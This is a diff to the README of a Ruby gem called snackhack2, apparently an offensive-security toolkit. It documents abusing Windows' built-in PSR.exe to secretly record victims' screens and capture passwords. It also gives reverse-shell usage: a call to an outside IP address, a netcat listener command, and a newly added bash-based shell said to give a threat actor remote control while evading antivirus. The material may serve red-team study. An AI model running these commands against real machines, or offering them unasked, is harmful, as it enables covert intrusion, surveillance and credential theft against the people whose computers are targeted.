@@ -64,7 +64,7 @@ gem install snackhack2
 
 ## Usage
 
-### LolBins MSR.exe Recording Screen
+### LolBin MSR.exe Recording Screen
 
 This feature uses Psr.exe to record the screen. By default it will record for 60 seconds. This can be changed by this:
 
@@ -77,7 +77,7 @@ After the selected time, a new file, which by default is named "screenshots.zip"
 
 The snippet below shows how `zip` can be used to create a different named zip file.
 
-PSR is built into Windows, many threat actors will use this feature to record the activity of a victims. Threat actors could use the screenshots to monitor the users, learn the company's procedures, record the user entering passwords.  This all can be done without a third party tool, LOLBins which stand for living off the land, LOLBins such as PSR can be used without the threat actor having to download a tool or worrying about the tool being detected by AntiVirus
+PSR is built into Windows, many threat actors will use this feature to record the activity of a victims. Threat actors could use the screenshots to monitor the users, learn the company's procedures, record the user entering passwords.  This all can be done without a third party tool, LOLBins which stand for living off the land are tools built in to windows that can be used by threat actors for malicious purposes. LOLBins such as PSR can be used without the threat actor having to download a tool or worrying about the tool being detected by AntiVirus
 
 
 ```ruby
@@ -199,6 +199,12 @@ Will print out the command to run and will set a cron job that will run every mi
 
 ```ruby
 Snackhack2::ReverseShell.new("167.71.98.144", "99").run
+```
+
+This will use bash.exe to connect to a reverse shell. On the remote computer run: `nc -lvp 4444`. After running the code below the computer will connect to the remote server, giving the threat actor remote control of the computer. This is all done by Living of the land, without any third party tools, just the features built into Windows. This is favored by threat actors since they do not need to install any malware that could be detected and remvoed.
+```ruby
+rs = Snackhack2::ReverseShell.new("127.0.0.1", "4444")
+rs.bash
 ```
 
 ## Links
